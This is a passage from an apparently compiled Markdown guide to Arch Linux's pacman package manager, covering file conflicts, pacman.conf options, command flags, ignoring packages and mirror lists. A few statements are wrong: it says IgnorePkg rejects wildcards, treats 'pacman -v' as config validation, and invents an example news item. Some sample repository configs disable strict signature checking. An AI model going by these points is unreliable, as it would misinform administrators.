sudo mv /path/to/file /path/to/file.backup
sudo pacman -S package-name
```

This allows recovery if the removal was incorrect.

#### Method 3: Replace Conflicting Package

If the file is owned by another package being replaced:

```
sudo pacman -S new-package
```

Pacman prompts to remove the old package first:
```
:: new-package and old-package are in conflict. Remove old-package? [y/N]
```

Answer `y` to allow automatic replacement.

**Force replacement if needed:**
```
sudo pacman -Rdd old-package  # Remove without dependency checks
sudo pacman -S new-package
```

**Warning:** Use `-Rdd` carefully—it can break dependencies.

### Common Conflict Scenarios

#### Split Packages

A package is being split into multiple smaller packages:

**Example scenario:**
```
error: package-common: /usr/share/file exists in filesystem (owned by package-monolithic)
```

**Resolution:**
```
sudo pacman -S package-common package-specific --overwrite /usr/share/\*
```

Or remove the old package first:
```
sudo pacman -Rns package-monolithic
sudo pacman -S package-common package-specific
```

#### Merged Packages

Multiple packages are being consolidated into one:

**Resolution:**
```
sudo pacman -S unified-package
```

When prompted, confirm removal of the old packages.

#### leftover Files from AUR

AUR packages sometimes leave files that conflict with later official repository versions:

**Resolution:**
```
sudo pacman -R aur-package-name
sudo rm -r /path/to/leftover/files
sudo pacman -S official-package-name
```

Or use `--overwrite`:
```
sudo pacman -S --overwrite /path/to/files/\* official-package-name
```

#### Python Package Conflicts

Python packages installed with pip may conflict with pacman packages:

**Identify pip packages:**
```
pip list --user
```

**Resolution:**
```
pip uninstall conflicting-package
sudo pacman -S python-conflicting-package
```

**Best practice:** Use virtual environments for pip packages to avoid system conflicts.

### News and Announcements

#### Check Arch Linux News

Many file conflicts are documented in official news announcements:

```
https://archlinux.org/news/
```

Before resolving conflicts, check for:
- Manual intervention required notices
- Package migration announcements
- Known conflict resolutions
- Recommended action steps

**Example announcement:**
"filesystem: move /usr/bin to /usr/local/bin - manual intervention required"

These announcements provide specific instructions for common conflict scenarios.

### Handling Complex Conflicts

#### Multiple Conflicting Files

When many files conflict, use wildcards carefully:

```
sudo pacman -S --overwrite '/usr/share/package-name/*' package-name
```

Target only the specific directory to minimize risk.

#### Symlink Conflicts

Symlinks to real files can cause conflicts:

**Check if it's a symlink:**
```
ls -la /path/to/file
```

**Resolution:**
```
sudo rm /path/to/symlink
sudo pacman -S package-name
```

#### Permission Conflicts

Sometimes files exist but with wrong permissions:

**Check and fix permissions:**
```
ls -la /path/to/file
sudo chown root:root /path/to/file
sudo chmod 644 /path/to/file
```

Then retry installation.

### Preventive Measures

#### Use Official Repositories

Prefer official repository packages over:
- Manual installations
- Pip/gem/npm system-wide installations
- Compiled software without proper packaging

This reduces untracked file conflicts.

#### Clean Build Artifacts

After building packages, clean up properly:

```
rm -rf src/ pkg/  # In PKGBUILD directories
```

Don't run `makepkg` as root, which creates root-owned files.

#### Avoid System-Wide Language Package Managers

Use language-specific package managers in isolation:

```
pip install --user package  # User-local
python -m venv venv         # Virtual environment
```

Avoid `sudo pip install` which installs system-wide.

### Recovery from Failed Resolution

#### Restore Backup Files

If `--overwrite` caused issues:

```
sudo cp /path/to/file.backup /path/to/file
```

#### Reinstall Affected Package

Restore original files:

```
sudo pacman -S --overwrite '*' package-name
```

#### Check Package Integrity

Verify no damage occurred:

```
pacman -Qkk package-name
```

### Documentation and Reporting

#### Document Your Resolution

Keep records of conflict resolutions:

```
# ~/.pacman-conflicts.log
2025-11-01: Resolved /usr/share/file conflict between pkg-old and pkg-new using --overwrite
```

This helps troubleshoot future issues.

#### Report Persistent Conflicts

If conflicts persist or seem incorrect:

1. Check if others report the same issue (forums, bug tracker)
2. Verify you're following official news announcements
3. Report to package maintainer if it's a packaging bug
4. Include full error output and `pacman -Qi` for both packages

### Best Practices

**Read error messages carefully:** Identify exactly which files conflict and which packages are involved.

**Check ownership first:** Use `pacman -Qo` before removing or overwriting files.

**Prefer specific --overwrite:** Target specific files/directories rather than using wildcards.

**Backup important files:** Use `mv` to backup before deletion, allowing recovery.

**Follow news announcements:** Manual intervention instructions prevent conflicts.

**Don't use --overwrite '*' routinely:** It should be a targeted solution, not a default.

**Understand file purpose:** Know what you're overwriting before proceeding.

**Clean up after yourself:** Remove temporary files and build artifacts promptly.

**Use proper package managers:** Install software through pacman when possible.

**Virtual environments:** Isolate language-specific packages from the system.

File conflicts are usually straightforward to resolve once you understand their cause. Most conflicts result from legitimate package reorganization and can be safely resolved with `--overwrite` for specific files.

# Pacman Configuration

## Repository Configuration

### Configuration File Location

Pacman's main configuration file is `/etc/pacman.conf`. This file controls pacman's behavior and defines which repositories are available for package installation and updates.

### Configuration File Structure

#### Sections

The configuration file uses an INI-style format with sections:

**[options] section:** Global settings that affect pacman's behavior

**Repository sections:** Define available package repositories (e.g., [core], [extra], [multilib])

#### Basic Syntax

```
# Comments start with #
[section-name]
Directive = value
Directive = value1 value2  # Space-separated values
```

### Global Options ([options] Section)

#### Essential Options

**RootDir:** Set the root directory for all pacman operations (default: `/`)

```
RootDir = /
```

**DBPath:** Package database location (default: `/var/lib/pacman/`)

```
DBPath = /var/lib/pacman/
```

**CacheDir:** Package cache directory (default: `/var/cache/pacman/pkg/`)

```
CacheDir = /var/cache/pacman/pkg/
```

Multiple cache directories can be specified:
```
CacheDir = /var/cache/pacman/pkg/
CacheDir = /mnt/storage/cache/
```

**GPGDir:** GnuPG keyring directory (default: `/etc/pacman.d/gnupg/`)

```
GPGDir = /etc/pacman.d/gnupg/
```

**LogFile:** Pacman log location (default: `/var/log/pacman.log`)

```
LogFile = /var/log/pacman.log
```

**HookDir:** Hook directories (default: `/etc/pacman.d/hooks/`)

```
HookDir = /etc/pacman.d/hooks/
HookDir = /usr/share/libalpm/hooks/
```

#### Package Handling Options

**HoldPkg:** Packages that require extra confirmation before removal

```
HoldPkg = pacman glibc
```

This prevents accidental removal of critical packages.

**IgnorePkg:** Packages to skip during upgrades

```
IgnorePkg = linux firefox
```

Useful for temporarily holding back problematic updates.

**IgnoreGroup:** Package groups to skip during upgrades

```
IgnoreGroup = gnome
```

**NoUpgrade:** Files that should never be overwritten during package upgrades

```
NoUpgrade = etc/pacman.conf etc/makepkg.conf
```

Paths are relative to the root directory.

**NoExtract:** Files that should never be extracted from packages

```
NoExtract = usr/share/doc/*
```

#### Architecture Configuration

**Architecture:** System architecture (usually auto-detected)

```
Architecture = auto
```

Or specify explicitly:
```
Architecture = x86_64
```

#### Download and Parallel Operations

**ParallelDownloads:** Number of concurrent downloads (requires pacman 6.0+)

```
ParallelDownloads = 5
```

This significantly speeds up package downloads by downloading multiple packages simultaneously.

#### Miscellaneous Options

**UseSyslog:** Log to system journal in addition to pacman.log

```
UseSyslog
```

**Color:** Enable colored output in terminal

```
Color
```

**CheckSpace:** Check available disk space before installing

```
CheckSpace
```

**VerbosePkgLists:** Display package name, version, and size in lists

```
VerbosePkgLists
```

**ILoveCandy:** Easter egg - changes progress bar to Pac-Man animation

```
ILoveCandy
```

#### Signature Verification

**SigLevel:** Global signature verification requirements

```
SigLevel = Required DatabaseOptional
```

**Common SigLevel values:**
- `Required` - Signatures mandatory for packages
- `Optional` - Signatures checked if present
- `Never` - No signature checking (insecure)
- `PackageRequired` - Package signatures required
- `DatabaseOptional` - Database signatures optional
- `TrustedOnly` - Only accept trusted keys (default)
- `TrustAll` - Accept any signature (debugging only)

**LocalFileSigLevel:** Signature requirements for local packages (`pacman -U`)

```
LocalFileSigLevel = Optional
```

**RemoteFileSigLevel:** Signature requirements for remote repository packages

```
RemoteFileSigLevel = Required
```

### Repository Configuration

#### Official Repositories

Standard Arch Linux repositories:

```
[core]
Include = /etc/pacman.d/mirrorlist

[extra]
Include = /etc/pacman.d/mirrorlist

[multilib]
Include = /etc/pacman.d/mirrorlist
```

**Repository order matters:** Pacman searches repositories in the order they appear in the configuration file. If a package exists in multiple repositories, the first match is used.

#### Repository Directives

**Include:** Include another configuration file

```
Include = /etc/pacman.d/mirrorlist
```

The mirrorlist file contains `Server` directives with mirror URLs.

**Server:** Directly specify repository servers

```
[custom-repo]
Server = https://example.com/repo/$arch
Server = file:///home/user/packages
```

**Variable substitution:**
- `$repo` - Repository name
- `$arch` - System architecture

**SigLevel (per-repository):** Override global signature requirements

```
[custom-repo]
SigLevel = Optional TrustAll
Server = https://example.com/repo/$arch
```

**Usage:** Repository usage priority

```
[repo-name]
Usage = Search Install Upgrade All
```

Values: `Sync`, `Search`, `Install`, `Upgrade`, `All`

### Mirror Configuration

#### Mirrorlist File

The `/etc/pacman.d/mirrorlist` file contains available mirrors:

```
## Arch Linux repository mirrorlist
Server = https://mirror1.example.com/archlinux/$repo/os/$arch
Server = https://mirror2.example.com/archlinux/$repo/os/$arch
#Server = https://mirror3.example.com/archlinux/$repo/os/$arch
```

**Format:**
- Uncommented lines are active
- Lines starting with `#` are disabled
- Mirrors are tried in order until one succeeds

#### Updating Mirrorlist

**Using reflector (Arch Linux):**
```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Using pacman-mirrors (Manjaro):**
```
sudo pacman-mirrors --fasttrack
```

**Manual editing:**
```
sudo nano /etc/pacman.d/mirrorlist
```

Move preferred mirrors to the top by uncommenting them and commenting out others.

### Custom Repositories

#### Adding Third-Party Repositories

Add custom repository sections to `/etc/pacman.conf`:

```
[custom-repo]
SigLevel = Optional TrustAll
Server = https://custom-repo.example.com/$arch
```

**Then synchronize:**
```
sudo pacman -Sy
```

#### Local Repository

Create a local repository for custom packages:

```
[local]
SigLevel = Optional TrustAll
Server = file:///home/user/repo
```

**Create the repository database:**
```
repo-add /home/user/repo/local.db.tar.gz /home/user/repo/*.pkg.tar.zst
```

#### AUR Helpers and Custom Repos

Some AUR helpers (like `chaotic-aur`) provide additional repositories:

```
[chaotic-aur]
Include = /etc/pacman.d/chaotic-mirrorlist
```

Follow the repository's specific setup instructions for keyring initialization.

### Testing Repositories

#### Enabling Testing Repos

Arch Linux provides testing repositories for pre-release packages:

```
[core-testing]
Include = /etc/pacman.d/mirrorlist

[extra-testing]
Include = /etc/pacman.d/mirrorlist

[multilib-testing]
Include = /etc/pacman.d/mirrorlist
```

**Important:** Place testing repositories **before** their stable counterparts so they take precedence:

```
[core-testing]
Include = /etc/pacman.d/mirrorlist

[core]
Include = /etc/pacman.d/mirrorlist
```

**Warning:** Testing repositories contain unstable packages. Only enable if you're prepared to handle issues and provide feedback.

### Configuration Validation

#### Test Configuration

Verify configuration syntax:

```
pacman -v
```

This displays current configuration including all paths and repositories.

#### Check Repository Status

List all configured repositories:

```
pacman -Sl
```

This queries all repositories and lists available packages.

**Check specific repository:**
```
pacman -Sl repository-name
```

### Configuration Best Practices

**Backup configuration:** Before making changes, backup `/etc/pacman.conf`:
```
sudo cp /etc/pacman.conf /etc/pacman.conf.backup
```

**Comment changes:** Document modifications with comments:
```
# 2025-11-01: Added custom repository for work packages
[work-repo]
Server = https://repo.work.com/$arch
```

**Minimal IgnorePkg:** Only ignore packages temporarily; resolve issues properly rather than permanently ignoring updates.

**Use Include for mirrors:** Keep mirror lists in `/etc/pacman.d/mirrorlist` for easier management.

**Signature verification:** Keep `SigLevel = Required` for security; only use `Optional` or `TrustAll` for trusted custom repositories.

**Test after changes:** Run `pacman -Sy` after configuration changes to ensure repositories are accessible.

**Repository order:** Place higher-priority repositories first in the configuration.

**Regular updates:** Keep the mirrorlist updated for best download speeds.

**Document custom repos:** Maintain a list of custom repositories and why they're needed.

### Restoring Default Configuration

If configuration becomes corrupted:

**Download default config:**
```
sudo curl -o /etc/pacman.conf https://gitlab.archlinux.org/archlinux/packaging/packages/pacman/-/raw/main/pacman.conf
```

**Or reinstall pacman package:**
```
sudo pacman -S pacman --overwrite /etc/pacman.conf
```

Configuration management is essential for controlling pacman's behavior, defining available packages, and maintaining system security through proper signature verification settings.

## Options and Flags

### Operation Flags (Primary Operations)

Pacman requires one of these primary operation flags to specify the type of action:

**-S, --sync:** Synchronize packages from repositories (install/upgrade)
```
pacman -S package_name
```

**-R, --remove:** Remove packages from the system
```
pacman -R package_name
```

**-Q, --query:** Query the local package database
```
pacman -Q
```

**-U, --upgrade:** Install packages from local files or URLs
```
pacman -U package-file.pkg.tar.zst
```

**-F, --files:** Query the files database
```
pacman -F filename
```

**-D, --database:** Modify package database (change install reasons)
```
pacman -D --asexplicit package_name
```

### Global Options (Apply to All Operations)

#### Path Configuration

**-b, --dbpath \<path\>:** Specify alternative database path
```
pacman --dbpath /custom/db/path
```
**Note:** This is an absolute path; root is not automatically prepended.[5]

**-r, --root \<path\>:** Specify alternative installation root
```
pacman --root /mnt
```
**Note:** Not suitable for mounted guest systems; use `--sysroot` instead.[5]

**--sysroot \<dir\>:** Operate on a mounted guest system
```
pacman --sysroot /mnt/guest
```

**--cachedir \<dir\>:** Specify alternative cache directory
```
pacman --cachedir /custom/cache
```
**Note:** Absolute path, root not automatically prepended.[5]

**--gpgdir \<dir\>:** Specify alternative GnuPG directory
```
pacman --gpgdir /custom/gnupg
```

**--hookdir \<dir\>:** Specify alternative hooks directory
```
pacman --hookdir /custom/hooks
```

**--logfile \<file\>:** Specify alternative log file
```
pacman --logfile /custom/pacman.log
```

**--config \<file\>:** Use alternative configuration file
```
pacman --config /custom/pacman.conf
```

#### System and Architecture

**--arch \<arch\>:** Specify architecture
```
pacman --arch x86_64
```

#### Output Control

**-v, --verbose:** Display verbose output
```
pacman -v
```

**--color \<when\>:** Control colored output
```
pacman --color always   # Force colors on
pacman --color never    # Force colors off
pacman --color auto     # Auto (default for tty)
```


**--debug:** Display debug messages
```
pacman --debug
```

**--noconfirm:** Bypass confirmation prompts
```
pacman -Syu --noconfirm
```

**--confirm:** Ask for confirmation (opposite of --noconfirm)
```
pacman --confirm
```

**--noprogressbar:** Disable progress bar display
```
pacman --noprogressbar
```

**--disable-download-timeout:** Disable download timeout
```
pacman --disable-download-timeout
```

**--disable-sandbox:** Disable process sandboxing
```
pacman --disable-sandbox
```

### Transaction Options (Apply to -S, -R, -U)

**-d, --nodeps:** Skip dependency checks
```
pacman -Sd package_name  # Single level
pacman -Sdd package_name # All checks
```


**--assume-installed \<package=version\>:** Assume a package is installed
```
pacman --assume-installed package=1.0
```
Works like `--nodeps` but for specific packages.[5]

**--dbonly:** Modify database only, don't touch files
```
pacman -S --dbonly package_name
```


**--noscriptlet:** Skip install/upgrade scriptlets
```
pacman -S --noscriptlet package_name
```


**-p, --print:** Print targets instead of performing operation
```
pacman -Sp package_name   # Print URLs
pacman -Rp package_name   # Print package names
```


**--print-format \<format\>:** Customize print output format
```
pacman -Sp --print-format "%n %v"
```
Default format is `%l` (URLs for -S, filenames for -U, pkgname-pkgver for -R).[2][5]

### Sync Options (Apply to -S)

#### Basic Sync Operations

**-y, --refresh:** Refresh package databases
```
pacman -Sy      # Refresh once
pacman -Syy     # Force refresh
```


**-u, --sysupgrade:** Upgrade installed packages
```
pacman -Su      # Upgrade
pacman -Suu     # Allow downgrades
```


**-c, --clean:** Remove old packages from cache
```
pacman -Sc      # Remove uninstalled packages
pacman -Scc     # Remove all cached packages
```

**-g, --groups:** View or install package groups
```
pacman -Sg               # List all groups
pacman -Sg group_name    # List group members
pacman -S group_name     # Install group
```

**-i, --info:** Display package information
```
pacman -Si package_name   # Repository package info
pacman -Sii package_name  # Include reverse dependencies
```


**-l, --list:** List repository packages
```
pacman -Sl               # All packages
pacman -Sl repo_name     # Specific repository
```


**-s, --search:** Search package names and descriptions
```
pacman -Ss search_term
```

**-q, --quiet:** Quiet output (names only)
```
pacman -Ssq search_term
```


### Upgrade Options (Apply to -S and -U)

**-w, --downloadonly:** Download packages without installing
```
pacman -Sw package_name
pacman -Syuw            # Download upgrades only
```


**--asdeps:** Mark packages as dependencies
```
pacman -S --asdeps package_name
```


**--asexplicit:** Mark packages as explicitly installed
```
pacman -S --asexplicit package_name
```


**--ignore \<package\>:** Skip specific packages during upgrade
```
pacman -Syu --ignore linux,firefox
```


**--ignoregroup \<group\>:** Skip package groups during upgrade
```
pacman -Syu --ignoregroup gnome
```


**--needed:** Don't reinstall up-to-date packages
```
pacman -S --needed package_name
```


**--overwrite \<glob\>:** Overwrite conflicting files
```
pacman -S --overwrite /path/to/file package_name
pacman -S --overwrite '*' package_name  # All files
```


Multiple patterns can be specified:
```
pacman -S --overwrite /usr/lib/\* --overwrite /usr/bin/\* package_name
```

Patterns can be negated with `!`:
```
pacman -S --overwrite '/usr/\*' --overwrite '!/usr/bin/\*' package_name
```


### Query Options (Apply to -Q)

**-c, --changelog:** View package changelog
```
pacman -Qc package_name
```


**-d, --deps:** List dependency packages
```
pacman -Qd      # All dependencies
pacman -Qdt     # Orphaned dependencies
```


**-e, --explicit:** List explicitly installed packages
```
pacman -Qe      # All explicit
pacman -Qet     # Explicit not required by others
```


**-g, --groups:** Display package groups
```
pacman -Qg               # All groups
pacman -Qg group_name    # Specific group
```


**-i, --info:** Display package information
```
pacman -Qi package_name   # Basic info
pacman -Qii package_name  # Include backup files
```


**-k, --check:** Check package files
```
pacman -Qk package_name   # File presence
pacman -Qkk package_name  # Detailed check
```


**-l, --list:** List package files
```
pacman -Ql package_name
```


**-m, --foreign:** List foreign packages (AUR/manually installed)
```
pacman -Qm
```


**-n, --native:** List native packages (from repositories)
```
pacman -Qn
```


**-o, --owns \<file\>:** Find package owning a file
```
pacman -Qo /usr/bin/vim
```


**-p, --file:** Query package file instead of database
```
pacman -Qip package.pkg.tar.zst
pacman -Qlp package.pkg.tar.zst
```


**-q, --quiet:** Quiet output (names only)
```
pacman -Qq      # All packages (names)
pacman -Qeq     # Explicit packages (names)
```


**-s, --search \<regexp\>:** Search installed packages
```
pacman -Qs search_term
```


**-t, --unrequired:** List unrequired packages
```
pacman -Qt      # Not required
pacman -Qtt     # Include optional requirements
```


**-u, --upgrades:** List out-of-date packages
```
pacman -Qu
```


### Remove Options (Apply to -R)

**-c, --cascade:** Remove package and all dependents
```
pacman -Rc package_name
```
**Warning:** Removes packages that depend on the target.[5][2]

**-n, --nosave:** Don't create .pacsave backup files
```
pacman -Rn package_name
```


**-s, --recursive:** Remove dependencies
```
pacman -Rs package_name   # Remove unneeded dependencies
pacman -Rss package_name  # Remove all dependencies
```


**-u, --unneeded:** Remove targets not required by others
```
pacman -Ru package_name
```


### Files Options (Apply to -F)

**-y, --refresh:** Refresh files database
```
pacman -Fy
```

**-l, --list:** List files in package
```
pacman -Fl package_name
```

**-s, --search:** Search for packages containing files
```
pacman -F filename
```

**-o, --owns:** Query remote package owning file
```
pacman -F /usr/bin/program
```

**-q, --quiet:** Quiet output
```
pacman -Flq package_name
```

### Database Options (Apply to -D)

**--asdeps:** Mark packages as dependencies
```
pacman -D --asdeps package_name
```

**--asexplicit:** Mark packages as explicitly installed
```
pacman -D --asexplicit package_name
```

**-k, --check:** Check database consistency
```
pacman -Dk
```

### Common Flag Combinations

**Full system upgrade:**
```
pacman -Syu
```

**Install with dependencies:**
```
pacman -S package_name
```

**Remove with config files and dependencies:**
```
pacman -Rns package_name
```

**Search repositories:**
```
pacman -Ss search_term
```

**Search installed:**
```
pacman -Qs search_term
```

**List orphaned packages:**
```
pacman -Qdt
```

**Check for updates:**
```
pacman -Qu
```

**Download without installing:**
```
pacman -Sw package_name
```

**Install local package:**
```
pacman -U package.pkg.tar.zst
```

These options and flags provide comprehensive control over pacman's behavior, allowing fine-tuned package management operations tailored to specific needs.

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] pacman(8) https://pacman.archlinux.page/pacman.8.html
[3] An intro to pacman commands - Newbie https://forum.endeavouros.com/t/an-intro-to-pacman-commands/9614
[4] Asking for a Safe pacman command list and good practices ... https://www.reddit.com/r/archlinux/comments/1g6ydx8/asking_for_a_safe_pacman_command_list_and_good/
[5] pacman(8) - Arch manual pages https://man.archlinux.org/man/pacman.8.en
[6] Pacman cheatsheet https://devhints.io/pacman
[7] Pacman Cheatsheet https://gist.github.com/HFTrader/4fb15d461d86634fd1cba5d251ca7925
[8] Arch Linux pacman – Just the Most Useful Commands https://psychocod3r.wordpress.com/2021/07/11/arch-linux-pacman-just-the-most-useful-commands/
[9] pacman cheat sheet - Linux Audit https://linux-audit.com/cheat-sheets/pacman/

## Ignore and Hold Packages

### IgnorePkg Configuration

The `IgnorePkg` directive in `/etc/pacman.conf` prevents specific packages from being upgraded during system updates.[3][5][6]

#### Basic Syntax

Edit `/etc/pacman.conf` and locate the `[options]` section:

```
sudo nano /etc/pacman.conf
```

Add packages to ignore:

```
[options]
IgnorePkg = package_name
```


**Multiple packages on one line (space-separated):**
```
IgnorePkg = linux firefox vlc
```


**Multiple packages on separate lines:**
```
IgnorePkg = linux
IgnorePkg = firefox
IgnorePkg = vlc
```


Both formats can be combined and work identically.[1]

#### Example: Ignore Kernel Updates

A common use case is holding back kernel updates when using proprietary drivers:

```
[options]
IgnorePkg = linux linux-headers
```


This prevents kernel and matching headers from updating, ensuring driver compatibility.[5]

#### Verification

After configuring, run a system update to verify:

```
sudo pacman -Syu
```

You'll see warnings for ignored packages:
```
warning: linux: ignoring package upgrade (6.8.1.arch1-1 => 6.9.0.arch1-1)
warning: firefox: ignoring package upgrade (120.0-1 => 121.0-1)
```


This confirms the packages are being skipped.[5]

### IgnoreGroup Configuration

The `IgnoreGroup` directive ignores all packages in a specified group during upgrades.[7][6]

#### Syntax

```
[options]
IgnoreGroup = group_name
```


**Multiple groups (space-separated):**
```
IgnoreGroup = gnome plasma
```

**Example: Ignore Desktop Environment**
```
IgnoreGroup = plasma-desktop
```


This prevents all packages in the `plasma-desktop` group from updating.[6]

#### Shell-Style Glob Patterns

`IgnoreGroup` supports glob patterns:
```
IgnoreGroup = gnome*
```


This matches all groups beginning with "gnome".[7]

### Temporary Ignoring (Command-Line)

For one-time upgrades, use the `--ignore` flag without modifying configuration files.[3][8][5][6]

#### Single Package

```
sudo pacman -Syu --ignore linux
```


#### Multiple Packages (Comma-Separated)

```
sudo pacman -Syu --ignore linux,firefox
```


**Note:** Commas separate packages; no spaces after commas.[1][8]

#### Multiple --ignore Flags

Alternative syntax using repeated flags:
```
sudo pacman -Syu --ignore linux --ignore firefox --ignore vlc
```


Both methods work identically.[1]

#### Temporary Group Ignoring

```
sudo pacman -Syu --ignoregroup plasma-desktop
```


This ignores an entire group for one upgrade cycle.[6]

### Manually Updating Ignored Packages

#### Override IgnorePkg Temporarily

When a package is in `IgnorePkg`, explicitly installing it bypasses the ignore directive:[5][1]

```
sudo pacman -S package_name
```


**Pacman assumes you're smarter than it**: Explicitly requesting an ignored package overrides the ignore setting.[1]

**Example:**
```
sudo pacman -S linux
```

This updates the kernel even if it's in `IgnorePkg`.[5]

#### Install and Resume Ignoring

Pacman will prompt for confirmation:
```
:: linux is in IgnorePkg/IgnoreGroup. Install anyway? [Y/n]
```


Answer `y` to proceed. The package returns to the ignore list after installation.[6]

### Limitations and Considerations

#### No Wildcard Support

`IgnorePkg` does **not** support wildcards like `linux*`. Each package must be explicitly listed:[5]

**Incorrect:**
```
IgnorePkg = linux*
```

**Correct:**
```
IgnorePkg = linux linux-headers linux-docs linux-lts
```


For kernel packages, you must list all related components individually.[5]

#### Partial Upgrades Risk

**Critical warning**: Ignoring packages creates partial upgrade scenarios, which are **unsupported** on Arch Linux. This can lead to:[2]
- Dependency conflicts
- System instability
- Package breakage
- Difficult-to-diagnose issues

**Best practices:**
- Use `IgnorePkg` sparingly and temporarily
- Monitor ignored packages regularly
- Update ignored packages as soon as possible
- Document why packages are ignored[5]

#### Rolling Release Considerations

Arch Linux is a rolling release; long-term package ignoring eventually causes dependency problems. If you need stable versions:[2]
- Consider using containers or VMs for critical services
- Use LTS alternatives (Ubuntu Server, Rocky Linux) for databases or production services
- Regularly review and minimize ignored packages[2]

### Removing Packages from Ignore List

#### Edit Configuration File

Remove or comment out the `IgnorePkg` line:

**Before:**
```
IgnorePkg = vlc firefox
```

**After (remove vlc):**
```
IgnorePkg = firefox
```

Or comment out to disable:
```
#IgnorePkg = vlc firefox
```


Save the file and run `pacman -Syu` to update previously ignored packages.[6]

### HoldPkg vs IgnorePkg

#### HoldPkg Configuration

`HoldPkg` is different from `IgnorePkg`—it requires **extra confirmation** before removal but doesn't prevent upgrades:

```
[options]
HoldPkg = pacman glibc
```

**Purpose**: Protects critical system packages from accidental removal.

**Behavior**: Prompts for additional confirmation when attempting to remove listed packages.

**Use case**: Prevents accidentally removing essential packages like `pacman` or `glibc` that would break the system.

#### Comparison

**IgnorePkg:**
- Prevents upgrades
- Allows removal
- Used to hold back updates

**HoldPkg:**
- Allows upgrades
- Protects from removal
- Used to protect critical packages

### Practical Use Cases

#### Case 1: Problematic Kernel Update

A new kernel breaks your system:

**Temporary solution:**
```
sudo pacman -Syu --ignore linux,linux-headers
```

**Permanent (until fixed):**
```
[options]
IgnorePkg = linux linux-headers
```


Monitor Arch news for kernel fixes, then remove from ignore list.[5]

#### Case 2: Custom-Compiled Software

You've compiled a package with custom patches:

```
[options]
IgnorePkg = custom-package
```

This prevents pacman from overwriting your custom build.[5]

#### Case 3: Driver Compatibility

NVIDIA or VirtualBox drivers lag behind kernel updates:

```
[options]
IgnorePkg = linux linux-headers
```


Update only when matching driver versions are available.[5]

#### Case 4: Testing Before Production

Hold back packages on production systems while testing on development machines:

```
[options]
IgnorePkg = postgresql nginx
```

Update after verifying stability in test environment.

### Monitoring Ignored Packages

#### List Current Ignored Packages

View current configuration:
```
grep "^IgnorePkg" /etc/pacman.conf
grep "^IgnoreGroup" /etc/pacman.conf
```

#### Check Available Updates for Ignored Packages

See what updates are being held back:
```
pacman -Qu
```

Ignored packages won't appear here, so manually check:
```
pacman -Si package_name | grep Version
pacman -Qi package_name | grep Version
```

Compare repository vs installed versions.

### Best Practices

**Use sparingly**: Only ignore packages when absolutely necessary.[5]

**Document reasons**: Add comments in `pacman.conf` explaining why packages are ignored:
```
# Holding linux kernel - NVIDIA driver compatibility
IgnorePkg = linux linux-headers
```


**Regular review**: Periodically check if ignored packages can be updated safely.[5]

**Prefer --ignore flag**: For one-time deferrals, use command-line `--ignore` instead of editing configuration.[5]

**Monitor dependencies**: Watch for dependency conflicts caused by ignored packages.[2]

**Update ASAP**: Return to normal updates as soon as issues are resolved.[5]

**Read Arch news**: Check archlinux.org/news before ignoring packages—manual intervention instructions may exist.[5]

**Security considerations**: Ignoring packages may delay security updates; evaluate risks carefully.[5]

Package ignoring is a powerful feature for managing problematic updates, but should be used judiciously to avoid creating system instability through partial upgrades.

Sources
[1] pacman -Syu - ignore multiple packages https://bbs.archlinux.org/viewtopic.php?id=42319
[2] Can I force pacman to ignore a file while updating ... https://www.reddit.com/r/archlinux/comments/1e2b70k/can_i_force_pacman_to_ignore_a_file_while/
[3] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[4] Keep system updated with everything "but" - Pacman & ... https://forum.endeavouros.com/t/keep-system-updated-with-everything-but/25543
[5] How to Ignore Specific Package Updates on Arch Linux https://www.siberoloji.com/how-to-ignore-specific-package-updates-on-arch-linux/
[6] Ignore A Package From Being Upgraded In Arch Linux https://ostechnix.com/safely-ignore-package-upgraded-arch-linux/
[7] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[8] How to Ignore Kernel Upgrades on Arch Linux | Cyrus Yip's blog https://cyrusyip.org/en/posts/2022/06/30/ignore-kernel-upgrades-on-arch/
[9] Exclude an AUR package from updating https://forum.manjaro.org/t/exclude-an-aur-package-from-updating/174575

## Custom Mirror Configurations

### Mirror Configuration Overview

Mirrors are servers that host copies of Arch Linux package repositories. Pacman uses mirrors listed in `/etc/pacman.d/mirrorlist` to download packages. Properly configured mirrors improve download speeds and reliability.

### Mirrorlist File Location

The default mirrorlist is located at:
```
/etc/pacman.d/mirrorlist
```

This file contains a list of available mirror servers for Arch Linux repositories.

### Mirrorlist File Format

#### Basic Syntax

```
## Comment lines start with ##
## Active mirrors are uncommented
Server = https://mirror.example.com/archlinux/$repo/os/$arch
#Server = https://mirror2.example.com/archlinux/$repo/os/$arch
```

**Key elements:**
- Lines starting with `##` are comments
- Lines starting with `#Server` are disabled mirrors
- Active `Server` lines (no `#`) are used by pacman
- Mirrors are tried in order from top to bottom

#### Variable Substitution

**$repo:** Repository name (core, extra, multilib)
**$arch:** System architecture (x86_64)

Example:
```
Server = https://mirror.example.com/archlinux/$repo/os/$arch
```

Expands to:
```
https://mirror.example.com/archlinux/core/os/x86_64
https://mirror.example.com/archlinux/extra/os/x86_64
```

### Including Mirrorlist in pacman.conf

#### Repository Configuration

In `/etc/pacman.conf`, repositories reference the mirrorlist:

```
[core]
Include = /etc/pacman.d/mirrorlist

[extra]
Include = /etc/pacman.d/mirrorlist

[multilib]
Include = /etc/pacman.d/mirrorlist
```

The `Include` directive tells pacman to read mirror URLs from the specified file.

### Manual Mirror Configuration

#### Edit Mirrorlist File

Open the mirrorlist for editing:
```
sudo nano /etc/pacman.d/mirrorlist
```

#### Prioritize Fast Mirrors

Move preferred mirrors to the top of the file. Pacman uses mirrors in order, stopping at the first successful one:

**Example organization:**
```
## United States
Server = https://us-mirror1.archlinux.org/archlinux/$repo/os/$arch
Server = https://us-mirror2.archlinux.org/archlinux/$repo/os/$arch

## Europe
Server = https://eu-mirror1.archlinux.org/archlinux/$repo/os/$arch

## Asia
#Server = https://asia-mirror.archlinux.org/archlinux/$repo/os/$arch
```

#### Comment Out Slow Mirrors

Disable unreliable mirrors by adding `#`:
```
#Server = https://slow-mirror.example.com/archlinux/$repo/os/$arch
```

### Automated Mirror Selection

#### Using Reflector (Arch Linux)

Reflector automatically generates an optimized mirrorlist based on various criteria:

**Install reflector:**
```
sudo pacman -S reflector
```

**Generate mirrorlist:**
```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Common reflector options:**
- `--latest N` - Use N most recently synced mirrors
- `--protocol https` - Use only HTTPS mirrors
